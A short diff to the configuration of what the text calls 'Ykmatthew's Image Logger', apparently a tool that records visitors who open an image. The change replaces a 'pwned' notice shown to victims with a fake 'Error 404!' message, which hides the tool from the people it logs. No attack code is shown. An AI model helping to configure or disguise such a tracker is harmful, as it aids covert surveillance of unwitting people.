@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by Ykmatthew's Image Logger.", # Message to show
+        "message": "Error  404!", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
